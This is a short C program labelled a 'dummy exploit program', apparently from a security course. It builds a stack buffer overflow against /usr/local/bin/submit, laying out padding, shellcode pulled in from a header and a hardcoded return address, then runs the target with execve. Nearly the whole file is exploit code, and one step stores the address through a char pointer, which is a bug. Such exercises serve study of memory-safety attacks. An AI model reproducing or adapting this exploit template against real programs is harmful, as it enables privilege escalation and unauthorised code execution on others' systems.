/*
 * dummy exploit program
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "shellcode.h"
#define TARGET "/usr/local/bin/submit"      //exploit target file 

int main( void )                            //main program
{
  char *args[ 4 ];                          //command line arguments passed in to submit
  char *a;                                  //a pointer used to modify string
  char *env[ 1 ];                           //environment char pointer array
  char fileinput[ 1024 + 4 + 4 + 1 ];       //this is the file used to buffer overflow, size is the buffer maxium size + frame pointer + stack porinter + one
  FILE *fp;                                 //file iostream pointer
  long *retaddr = ( long * ) 0xFFBFDE08;    //the address we want to return to

  const int i = strlen( shellcode );        //length of shellcode

  memset( fileinput, 0x41, 982 );           //set the first 982 bit to 0x41 (aka A)
  a = fileinput + 982;                      //move pointer
  memcpy( a, shellcode, ( int ) i );        //continue change file context with shell code
  a = a + i;                                //move pointer
  memset( a, 0x41, 1 );                     //set the next one be A (padding due to shellcode length)
  a = a + 1;                                //move pointer
  *a = ( long ) retaddr;                    //here should be able to replace stack pointer to our shell code
  a = a + 4;                                //move pointer
  *a = '\0';                                //finish string
  fp = fopen( "file.txt", "w+" );           //open file to write
  fprintf( fp, "%s", fileinput );           //write string to the file "file.txt"
  fclose( fp );                             //close file


  args[ 0 ] = TARGET;                       //arg zero is the program we want to run
  args[ 1 ] = "file.txt";                   //first arg in the program
  args[ 2 ] = "message";                    //unchanged
  args[ 3 ] = NULL;                         //not used

  env[ 0 ] = NULL;                          //not used

  if ( execve( TARGET, args, env ) < 0 )    //execv a new process to run target program
    fprintf( stderr, "execve failed.\n" );  //if execv failed, return error message

  exit( 0 );                                //exit if execv failed
}
